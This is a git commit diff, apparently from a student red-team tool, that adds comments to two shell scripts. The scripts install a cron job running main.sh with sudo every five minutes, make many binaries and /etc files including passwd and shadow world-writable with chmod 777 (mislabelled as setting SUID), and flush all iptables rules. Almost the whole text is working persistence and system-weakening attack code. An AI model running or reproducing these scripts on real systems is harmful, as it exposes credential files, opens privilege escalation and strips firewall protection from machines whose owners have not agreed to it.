3758a7d8eeeeebb1323d0c5404027f328a1a978c
Dylan Nandlall <dan6705@rit.edu>
2022-10-05 21:58:40 -0400

    red team tool comment commits

--- deploy.sh
+++ deploy.sh
@@ -1,6 +1,8 @@
 ##Dylan Nandlall
 ##dan6705@rit.edu
 
+
+##Creates a crontab and references the main file to run every 5 minutes
 crontab -l > cron_bkp
 echo "*/5 * * * * sudo main.sh >/dev/null 2>&1" >> cron_bkp
 crontab cron_bkp
--- main.sh
+++ main.sh
@@ -1,18 +1,24 @@
 ##Dylan Nandlall 
 ##dan6705@rit.edu
 
+
+##Changes suid on binaries labeled in "bins" and "files"
 suid_tool() {
     echo "Setting SUID on binaries";
 
+    ##Variable with binaries that will get their SUID replaced
     bins="cat tar awk find nano vim vi xtables-multi cp less more nmap man"
     bins="$bins watch chmod mv ncat"
+    ##Variable with file binaries in /etc/
     files="passwd skel shadow httpd sshd"
 
+    ##Loops through bins and gives perms to the bins for the user
     for b in $bins; do
 	chmod 777 /usr/bin/$b;
         [ "$?" = "0" ] && echo "SUID set on $b";
     done
 
+    ##Loops through files and gives perms to the bins for the user
     for f in $files; do
         chmod 777 /etc/$f;
         [ "$?" = "0" ] && echo "SUID set on $f";
@@ -21,6 +27,8 @@ suid_tool() {
     return 0;
 };
 
+
+##Flushes iptables
 iptable_commands() {
     iptables -t mangle -F
     iptables -F
